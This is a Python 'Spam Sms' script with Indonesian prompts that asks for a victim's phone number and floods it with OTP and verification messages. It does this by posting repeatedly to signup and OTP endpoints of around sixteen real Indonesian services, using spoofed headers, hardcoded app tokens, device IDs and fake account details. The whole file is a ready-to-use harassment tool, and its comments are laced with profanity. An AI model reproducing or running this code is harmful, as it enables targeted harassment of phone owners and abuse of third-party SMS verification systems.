#Udah Tinggal Pake Aja Gan:v
#Buat Paan Recod? Belajar Bahasa Pemerograman Sana Hadeeehh Kek Kntl Lu
import requests as reek,json,os,time,requests
try:
	import pyfiglet
except:
	os.system("pip install pyfiglet")
req=reek.Session()
os.system('clear')
title=pyfiglet.figlet_format("Spam Sms")
p = "\33[37;1m"
h = "\33[32;1m"
m = "\33[31;1m"
ber=0
gag=0
class nyepam:
	def __init__(self,_8,_08,_62):
		self._8,self._08,self._62=_8,_08,_62
	def mulai(self,asu):
		try:
			for x in range(asu):
				send=req.post("https://cmsapi.mapclub.com/api/signup-otp",data={"phone":self._08},headers={"Connection": "keep-alive","User-Agent": "Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36"}).text
				if "ok" in send:break
				else:break
			for x in range(asu):
				send=req.post("https://api.adakami.id/adaKredit/pesan/kodeVerifikasi",data=json.dumps({"ketik":0,"nomor":"0"+self._8}),headers={"content-type": "application/json; charset=UTF-8","content-length": "34","accept-encoding": "gzip","user-agent": "okhttp/3.8.0","accept-language": "in","x-ada-token": "","x-ada-appid": "800006","x-ada-os": "android","x-ada-channel": "default","x-ada-mediasource": "","x-ada-agency": "adtubeagency","x-ada-campaign": "AdakamiCampaign","x-ada-role": "1","x-ada-appversion": "1.7.0","x-ada-device": "","x-ada-model": "SM-G935FD","x-ada-os-ver": "7.1.1","x-ada-androidid": "a4341a2sa90a4d97","x-ada-aid": "c7bbb23d-a220-4d43-9caf-153608f9bd39","x-ada-afid": "1580054114839-7395423911531673296"}).text
				if "Permintaan kode verifikasi sudah melebihi batas. Silakan coba lagi besok." in send:break
				else:break
			for x in range(asu):
				send=json.loads(reek.get(f"https://id.jagreward.com/member/verify-mobile/{self._8}").text)
				if send["message"]=="Anda akan menerima sebuah panggilan dari sistem kami. Silakan isi 6 ANGKA TERAKHIR dari nomor telepon dibawah ini.":continue
				else:break
			for x in range(asu):
				send=req.post("https://tokomanamana.com/ma/auth/request_token_merchant/",data={"phone":self._08},headers={"Host": "tokomanamana.com","Connection": "keep-alive","Content-Length": "18","Accept": "*/*","Origin": "https://tokomanamana.com","X-Requested-With": "XMLHttpRequest","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36","Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","Referer": "https://tokomanamana.com/ma/register","Accept-Encoding": "gzip, deflate","Accept-Language": "id-ID,en-US;q=0.8"}).text
				if "Kode OTP berhasil dikirim!" in send:continue
				else:break
			for x in range(asu):
				send=req.post("https://identity-gateway.oyorooms.com/identity/api/v1/otp/generate_by_phone?locale=id", data=json.dumps({"phone":self._8,"country_code": "+62","country_iso_code": "ID","nod": "4","send_otp": "true","devise_role": "Consumer_Guest"}),headers={"Host": "identity-gateway.oyorooms.com","consumer_host": "https://www.oyorooms.com","accept-language": "id","access_token": "SFI4TER1WVRTakRUenYtalpLb0w6VnhrNGVLUVlBTE5TcUFVZFpBSnc=","User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML,like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36","Content-Type": "application/json","accept": "*/*","origin": "https://www.oyorooms.com","referer": "https://www.oyorooms.com/login","Accept-Encoding": "gzip,deflate,br"}).text
				if "SUCCESSFULLY GENERATED OTP " in send:continue
				else:break
			for x in range(asu):
				send=req.post("https://app.cairin.id/v1/app/sms/sendCaptcha",data={"haveImageCode":"0","fileName":"6f8c3b90c845f09ff1bfe714a30aede8","phone":self._08,"imageCode":"","userImei":"","type":"registry"},headers={"user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; SM-J320M Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.110 Mobile Safari/537.36"}).text
				if "leftTimes" in send:continue
				else:break
			for x in range(asu):
				send=req.post("https://www.olx.co.id/api/auth/authenticate",data=json.dumps({"grantType": "retry","method": "sms","phone":self._62,"language": "id"}), headers={"accept": "*/*","x-newrelic-id": "VQMGU1ZVDxABU1lbBgMDUlI=","x-panamera-fingerprint": "83b09e49653c37fb4dc38423d82d74d7#1597271158063","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36","content-type": "application/json"}).text
				if "status" in send:continue
				else:break
			for x in range(asu):
				send=req.post("https://auth.dekoruma.com/api/v1/register/request-otp-phone-number/?format=json",data=json.dumps({"phoneNumber":self._62,"platform":"wa"}),headers={"content-type": "application/json","user-agent":"Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36"}).text
				if "" in send:continue
				else:break
			for x in range(asu):
				send=req.post("https://api.payfazz.com/v2/phoneVerifications",data={"phone":self._08},headers={"Host": "api.payfazz.com", "content-length": "17", "accept": "*/*", "origin": "https://www.payfazz.com","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36", "content-type": "application/x-www-form-urlencoded; charset=UTF-8", "referer": "http://www.payfazz.com/register/BEN6ZF74XL", "accept-encoding": "gzip, deflate, br", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}).text
				if "phoneVerificationId" in send:continue
				else:break
			for x in range(asu):
				send=req.post("https://harvestcakes.com/register",data={"phone":self._8},headers={"user-agent":"Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36"}).text
				if "function" in send:continue
				else:break
			for x in range(asu):
				send=reek.get("https://api.danacita.co.id/users/send_otp/?mobile_phone="+self._08,headers={"user-agent":"Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36"})
				load=json.loads(send.text)
				if load["detail"] == "Successfully sent OTP SMS":continue
				else:break
			for x in range(asu):
				send=req.post("https://api.gojekapi.com/v5/customers", data={"email": "nsjwwiwiwisnsnn12@gmail.com", "name": "akuinginterbang12", "phone":self._62, "signed_up_country": "ID"},headers={"X-Session-ID": "f8b67b26-c6a4-44d2-9d86-8d93a80901c9", "X-Platform": "Android", "X-UniqueId": "8606f4e3b85968fd", "X-AppVersion": "3.52.2", "X-AppId": "com.gojek.app", "Accept": "application/json", "Authorization": "Bearer", "X-User-Type": "customer", "Accept-Language": "id-ID", "X-User-Locale": "id_ID", "Host": "api.gojekapi.com", "Connection": "Keep-Alive", "Accept-Encoding": "gzip", "User-Agent": "okhttp/3.12.1"}).text
				if "success" in send:continue
				else:break
			for x in range(asu):
				send=req.post("https://u.icq.net/api/v14/rapi/auth/sendCode", data=json.dumps({"reqId": "64708-1593781791", "params": {"phone":self._62, "language": "en-US", "route": "sms", "devId": "ic1rtwz1s1Hj1O0r", "application": "icq"}}),headers={"accept": "*/*", "accept-language": "en-US,en;q=0.9,id;q=0.8,mt;q=0.7", "content-type": "application/json", "origin": "http://web.icq.com", "referer": "http://web.icq.com/", "sec-fetch-dest": "empty", "sec-fetch-mode": "cors", "sec-fetch-site": "cross-site", "User-Agent": "Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36"}).text
				if "results" in send:continue
				else:break
			for x in range(asu):
				send=reek.get(f"https://japi.maucash.id/welab-user/api/v1/send-sms-code?mobile={self._8}&channelType=0",headers={"Host":"japi.maucash.id","accept":"application/json, text/plain, */*","x-origin":"google play","x-org-id":"1","x-product-code":"YN-MAUCASH","x-app-version":"2.4.23","x-source-id":"android","accept-encoding":"gzip","user-agent":"okhttp/3.12.1"}).text
				if "Permintaan berhasil" in send:continue
				else:break
			for x in range(asu):
				a=reek.get("https://www.matahari.com/customer/account/create/")
				b=a.cookies["PHPSESSID"]
				send=req.post("https://www.matahari.com/rest/V1/thorCustomers",data=json.dumps({"thor_customer":{"name":" Kang Pacman","card_number":False,"email_address":"aapafandi01@gmail.com","mobile_country_code":"+62","gender_id":"1","mobile_number":self._08,"mro":"","password":"kontolanjingmemek6793","birth_date":"10/04/2000"}}),headers={"Host": "www.matahari.com","content-length": "245","x-newrelic-id": "Vg4GVFVXDxAGVVlVBgcGVlY=","x-requested-with": "XMLHttpRequest","user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; SM-J111F Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36","content-type": "application/json","accept": "*/*","referer": "https://www.matahari.com/customer/account/create/","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cookie": f"PHPSESSID={b}"}).text
				if "Success" in send:continue
				else:break
			for x in range(asu):
				send=req.post("https://tokomanamana.com/ma/auth/request_token_merchant/",data={"phone":self._08},headers={"Host": "tokomanamana.com","Connection": "keep-alive","Content-Length": "18","Accept": "*/*","Origin": "https://tokomanamana.com","X-Requested-With": "XMLHttpRequest","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36","Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","Referer": "https://tokomanamana.com/ma/register","Accept-Encoding": "gzip, deflate","Accept-Language": "id-ID,en-US;q=0.8"}).text
				if "Kode OTP berhasil dikirim!" in send:continue
				else:break
			bingung()
		except reek.exceptions.ReadTimeout:exit(f"{m}[!] Kesalahan Pada Koneksi")
		except reek.exceptions.ConnectionError:exit(f"{m}[!] Kesalahan Pada Koneksi")
		except (KeyboardInterrupt,EOFError):exit("[!] Exit")
__import__("os").system("clear")
def bingung():
	print(f"{h}\n[√] Semua Spam Terkirim Berhasil{p}\n")
	print(f"Ingin Spam Lagi?\nKetik y untuk ya ketik t untuk tidak\n")
	pilih=input("y/t : ")
	if(pilih=="y"):
		cok()
	elif(pilih=="t"):
		exite("Terima Kasih!")
	else:
		print("Masukan Yang Benar!")
		bingung()
def cok():
	while True:
		try:
			a=input("[+] Nomer Korban 08×××\t: ")
			asu=a[0:2]
			if a in(""," "):print("[!] Jangan Kosong Ajg")
			elif "08" not in asu:print("[!] Gunakan Nomer 08xxx\n")
			elif len(a)<=10:print("[!] Nomer Harus Lebih Dari 10 Angka")
			elif a=="083870396203":print("[!] Anda Tidak Bisa Spam Yang Punya Script Goblok!\n")
			else:
				try:
					suu=int(input("[+] Masukan Jumlah Spam\t: "))
				except:
					print("Masukan Format Angka Jangan Huruf!")
					cok()
				time.sleep(2)
				print("\n[+] Sedang Menyepam...")
				b=a[1:12] 
				c="62"+b
				nyepam(b,a,c).mulai(suu)
				break
		except Exception as ex:exit(str(ex))
		except (KeyboardInterrupt,EOFError):exit("[!] Exit")
def memek():
	print(f"{p}"+title+f"{h}\nFOLLOW IG @latipharkat_ | 16 Operator Otp{p}\n\nJangan Disalah Gunakan Anjg\nJumlah Spam Dikalikan Dengan 16\nContoh Jumlah Spam 2\nJadinya 2 Dikali 16 Spamnya 32\n")
if __name__=="__main__":
	memek()
	cok()
